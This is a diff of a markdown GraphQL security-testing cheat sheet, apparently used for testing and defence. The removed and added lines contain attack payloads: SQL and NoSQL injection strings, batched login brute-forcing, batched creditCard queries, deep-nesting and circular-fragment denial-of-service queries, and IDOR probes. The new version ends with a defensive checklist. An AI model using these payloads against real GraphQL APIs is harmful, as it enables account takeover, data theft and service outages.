@@ -1,64 +1,41 @@
-# GraphQL Security Testing
+# GraphQL Security: 2026 Reference
 
-## Information Disclosure
+## Attack Surface
 
 ### Introspection
-```graphql
-{__schema {types {name fields {name args {name type {name}}}}}}
-```
+- `/graphql?query={__schema{types{name}}}`
+- Disabled but field-guess still works
+- Batch queries bypass single-query rate limits
 
-### Field Suggestions
-```graphql
-# Send invalid field to get autocomplete suggestions
-{users {invalidField}}
-# Error: Cannot query field "invalidField". Did you mean "username", "email", "password"?
-```
-
-## Injection Attacks
-
-### SQL/NoSQL Injection
-```graphql
-{user(id: "1' OR 1=1--") {email password}}
-{login(username: "admin", password: {"$ne": ""}) {token}}
-```
-
-### Batch Brute Force
-```graphql
-mutation {
-  a: login(username: "admin", password: "0000") {success}
-  b: login(username: "admin", password: "0001") {success}
-}
-```
-
-## DoS Attacks
-
-### Deep Query
+### Batching Attacks
 ```graphql
 query {
-  user(id: 1) {
-    posts {comments {user {posts {comments {content}}}}}
-  }
+  a: user(id: 1) { creditCard }
+  b: user(id: 2) { creditCard }
+  c: user(id: 3) { creditCard }
 }
 ```
 
-### Alias Overload
-```graphql
-query {
-  a1: user(id: 1) {email}
-  a2: user(id: 1) {email}
-  ...repeat 1000 times
-}
-```
+### Mutation Enumeration
+- Brute force credentials via login mutation
+- Reset password: username + newPassword
+- Mass assignment
 
-## Authorization Failures
+### Depth-Based DoS
+- Deeply nested queries crash parser
+- `query { a: posts { comments { user { posts { comments { ... } } } } } }`
+- Circular fragments: `fragment X on Y { ...X }`
 
-### Missing Field-Level Auth
-```graphql
-{user(id: 1) {username}}  # OK
-{user(id: 2) {username}}  # Should fail - IDOR
-{user(id: 3) {password}}  # Should fail - field-level
-```
+## Tools
+- **InQL** (Burp extension): Introspection + query generation
+- **graphql-path-enum**: Brute-force field names (introspection disabled)
+- **Clairvoyance**: Introspection data reconstruction (blind)
 
-### Mutation Abuse
-```graphql
-mutation {deleteUser(id: 1)}  # Check authorization
+## Defensive Checklist
+1. Disable introspection in production
+2. Set max query depth (5-7 recommended)
+3. Set max query cost (rate limit by complexity)
+4. Implement query allowlisting
+5. Add rate limiting per user/IP
+6. Validate all mutation inputs
+7. Enforce auth on each resolver (not at endpoint level)
